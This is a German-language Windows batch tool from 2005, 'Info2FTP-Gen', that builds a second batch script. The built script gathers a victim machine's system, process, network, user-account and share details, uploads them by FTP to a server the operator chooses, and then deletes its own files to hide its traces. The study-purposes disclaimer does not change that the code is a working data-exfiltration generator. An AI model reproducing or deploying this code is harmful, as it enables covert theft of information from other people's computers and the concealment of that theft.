::Info2FTP by Mr Hawk
::
:: Dos-Gui by Mr Hawk
:: [BAD R.A.T.]-Company
:: www.bad-rat.de.vu

@echo off
goto $start$
:$start$
cls
title Info2FTP-Gen 0.1 by Mr Hawk [BAD R.A.T.]-Company
echo.
echo  ษอออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ               Info2FTP-Gen                บ
echo  บ               Version 0.1                 บ
echo  บ               by Mr Hawk                  บ
echo  บ                (c) 2005                   บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
echo  =============================================
echo   S   = Start Generator
echo   F   = Start FTP
echo   H   = Help
echo   A   = About
echo   W   = Web
echo   D   = Disclaimber
echo   E   = Exit
echo  =============================================
echo.
set /P cmd=  Bitte waehlen:
if %cmd%==S goto $start_gen$
if %cmd%==s goto $start_gen$
if %cmd%==F goto $start_ftp$
if %cmd%==f goto $start_ftp$
if %cmd%==H goto $me_help$
if %cmd%==h goto $me_help$
if %cmd%==A goto $my_about$
if %cmd%==a goto $my_about$
if %cmd%==W goto $start_web$
if %cmd%==w goto $start_web$
if %cmd%==D goto $my_dis$
if %cmd%==d goto $my_dis$
if %cmd%==E goto $exit_tool$
if %cmd%==e goto $exit_tool$

:$start_gen$
cls
set a=out
set c=ip
echo.

echo  ษอออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ               Info2FTP-Gen                บ
echo  บ               Version 0.1                 บ
echo  บ               by Mr Hawk                  บ
echo  บ                (c) 2005                   บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
set me=0
set /P myip= FTP-Servers                 :
set /P myuser= FTP-Username                :
set /P mypass= FTP-Passwort                :
set /P myfile= Name der Auslagerungsdatei  :
set /P outfile= Speichern unter (ohne *.bat):
echo.
echo.
echo Script wird erzeugt...
echo echo off   >%outfile%.bat
echo set ip=%myip% >>%outfile%.bat
echo set out=%myfile% >>%outfile%.bat
echo echo INFO2FTP by Mr Hawk ^>^>%%%a%%% >>%outfile%.bat
echo echo Datum: ^>^>%%%a%%% >>%outfile%.bat
echo date /T ^>^>%%%a%%% >>%outfile%.bat
echo echo Zeit:^>^>%%%a%%% >>%outfile%.bat
echo time /T ^>^>%%%a%%% >>%outfile%.bat
echo echo System ^>^>%%%a%%% >>%outfile%.bat
echo Vol c: ^>^>%%%a%%% >>%outfile%.bat
echo echo Systeminfo: ^>^>%%%a%%% >>%outfile%.bat
echo systeminfo ^>^>%%%a%%% >>%outfile%.bat
echo echo Taskliste: ^>^>%%%a%%%  >>%outfile%.bat
echo tasklist ^>^>%%%a%%% >>%outfile%.bat
echo echo Path: ^>^>%%%a%%%  >>%outfile%.bat
echo path ^>^>%%%a%%% >>%outfile%.bat
echo echo Keyboard:^>^>%%%a%%% >>%outfile%.bat
echo kb16 ^>^>%%%a%%% >>%outfile%.bat
echo echo Netzwerk: ^>^>%%%a%%% >>%outfile%.bat
echo netstat -a -e -n -p TCP -s ^>^>%%%a%%%  >>%outfile%.bat
echo  net accounts ^>^>%%%a%%% >>%outfile%.bat
echo net file ^>^>%%%a%%%  >>%outfile%.bat
echo net view ^>^>%%%a%%%  >>%outfile%.bat
echo net share ^>^>%%%a%%%  >>%outfile%.bat
echo net user ^>^>%%%a%%% >>%outfile%.bat
echo ipconfig -all ^>^>%%%a%%%  >>%outfile%.bat
echo proxycfg ^>^>%%%a%%% >>%outfile%.bat
echo echo exit
echo echo ascii>temp >>%outfile%.bat
echo echo user %myuser% %mypass%^>^>temp   >>%outfile%.bat
echo echo put %%%a%%%^>^>temp >>%outfile%.bat
echo echo QUIT>>temp  >>%outfile%.bat
echo FTP -v -i -A -s:temp %%%c%%%     >>%outfile%.bat
echo del %%%a%%% >>%outfile%.bat
echo del temp >>%outfile%.bat
echo del %%%me%.bat >>%outfile%.bat
echo.
echo Script wurde erfolgreich erzeugt und unter "%outfile%.bat" gespeichert.
echo.
pause
goto $start$


:$start_ftp$
cls
ftp
goto $start$
:$me_help$
cls
echo.
echo.
echo  ษHelpออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                                                    บ
echo  บ FTP-Server          =  Die IP des FTP Servers, zum hochladen       บ
echo  บ FTP-Username        =  Benutzername des FTP-Kontos                 บ
echo  บ FTP-Passwort        =  Das Passwort des FTP-Kontos                 บ
echo  บ Auslagerungsdatei   =  Name der gesendeten Datei                   บ
echo  บ Speichern           =  Speichername des neuerzeugenten Scripts     บ
echo  บ                                                                    บ
echo  ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
pause
goto $start$

:$my_about$
cls
echo.
echo.
echo  ษAboutออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ              Info2FTP-Gen                 บ
echo  บ               Version 0.1                 บ
echo  บ               by Mr Hawk                  บ
echo  บ                (c) 2005                   บ
echo  บ                                           บ
echo  บ          [BAD R.A.T.]-Company             บ
echo  บ            www.bad-rat.de.vu              บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
echo             ..::Batch is power!::..
echo.
pause
cls
echo.
echo.
echo  ษFeaturesอออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ -Liest viele wichtige Informationen aus   บ
echo  บ -Script verwischt seine Spuren automatischบ
echo  บ -Script ist kleiner als 1 KB (ca 550 Byte)บ
echo  บ -nur 36 Zeilen Code                       บ
echo  บ -erstelt über 12 KB Infodatei und ladet   บ
echo  บ  sie per FTP auf einen Server             บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo  ษTHXออออออออออออออออออออออออออออออออออออออออป
echo  บ                                           บ
echo  บ THX an                                    บ
echo  บ                                           บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
echo.
pause
goto $start$

:$my_dis$
cls
echo.
echo.
echo  ษDisclaimberออออออออออออออออออออออออออออออออออออออออออออออออออออป
echo  บ                                                               บ
echo  บ Dieses Tool ist fuer Studienzwecke geschrieben wurden.        บ
echo  บ Der Autor distanziert sich von jeglicher Verantwortung und    บ
echo  บ Haftung fuer eventelle Schaeden und kann nicht belangt werden.บ
echo  บ Jeder User ist selbst verantwortlich.                         บ
echo  บ                                                               บ
echo  บ (c) 2005 Mr Hawk [BAD R.A.T.]-Company                         บ
echo  บ                                                               บ
echo  ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo.
pause
goto $start$

:$start_web$
start http://www.bad-rat.de.vu
goto $start$

:$exit_tool$
echo.
echo THX for useing this tool
echo.
exit